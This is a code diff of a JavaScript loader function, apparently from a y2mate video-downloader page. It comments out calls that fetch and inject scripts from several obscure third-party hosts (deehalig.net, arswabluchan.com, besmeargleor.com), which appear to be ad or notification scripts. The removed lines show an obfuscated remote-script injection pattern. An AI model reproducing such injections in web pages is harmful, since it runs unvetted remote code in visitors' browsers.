@@ -17,7 +17,7 @@ var iqs_label = {
 function load_qc2mate() {
     if(da_load_qc){return true;}
     $.getScript("https://www.y2mate.com/themes/js/pn.js?v=1.1");
-    $.getScript("https://deehalig.net/ntfc.php?p=3461575")
+   /* $.getScript("https://deehalig.net/ntfc.php?p=3461575")
         .done(function( script, textStatus ) {
             if (typeof _vunmgjpd !== 'undefined' && $.isFunction(_vunmgjpd)){_vunmgjpd();}
             else if (typeof _trjzjc !== 'undefined' && $.isFunction(_trjzjc)){_trjzjc();}
@@ -26,9 +26,9 @@ function load_qc2mate() {
             if (typeof _izvdopjq !== 'undefined' && $.isFunction(_izvdopjq)){ _izvdopjq();}
             else if (typeof _iducnuwd !== 'undefined' && $.isFunction(_iducnuwd)){ _iducnuwd();}
         });
-    (function(d,z,s){s.src='//'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('arswabluchan.com',2970963,document.createElement('script'));
-    (function(d,z,s){s.src='//'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('besmeargleor.com',4854365,document.createElement('script'));
-    da_load_qc = true;
+    //(function(d,z,s){s.src='//'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('arswabluchan.com',2970963,document.createElement('script'));
+    //(function(d,z,s){s.src='//'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('besmeargleor.com',4854365,document.createElement('script'));
+    */da_load_qc = true;
 };
 function KHtmlEncode(s)
 {
